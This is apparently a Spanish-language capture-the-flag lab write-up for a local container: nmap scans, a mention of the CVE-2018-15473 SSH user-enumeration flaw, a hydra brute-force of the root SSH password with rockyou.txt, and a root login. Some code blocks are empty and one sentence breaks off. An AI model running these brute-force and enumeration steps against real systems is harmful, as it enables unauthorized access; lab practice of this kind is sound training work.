#tag

![](../../../Images/Pasted%20image%2020241008071626.png)
# Enumeración

## Nmap

El escaneo de **nmap** nos enseña la existencia de un servicio SSH.

```
> nmap --open --min-rate 10000 -Pn -n -oN scans/allTCPPorts $target

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-08 12:47 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000013s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

```
> nmap -oN scans/targetedTCPPorts -sCV $target -p 22,80                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-08 12:47 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
|_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```

## SSH (22 TCP Port)

Investigando el servicio vemos que es una vesiñon antigua que tiene una vulnerabildiad numerada como [CVE-2018-15473](https://nvd.nist.gov/vuln/detail/cve-2018-15473) el cual nos permite una enum,eración de usuarios. Con este [PoC](https://github.com/Sait-Nuri/CVE-2018-15473) y una lista de usuarios podemos conseguir que usaurios existen en el 

# Usuario Root

Hacemos un stego con `steghide` y obtenemos algo de información no importante.

```

```

Luego examinamos los metadatos de la imagen y conseguimos dar con un nombre de usuario.

```

```

Ahora, con el nombre de usuario podemos hacer fuerza bruta contra el servicio SSH con `hydra`.

```
> hydra -l root -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 12:54:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-08 12:54:31 
```

Conseguimos acceder al sistema mediante SSH directament con el usuario ``root`` y todos los privilegios del sistema.

```
> ssh root@172.17.0.2

The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
root@172.17.0.2's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@347cd6f2e506:~# whoami
root
```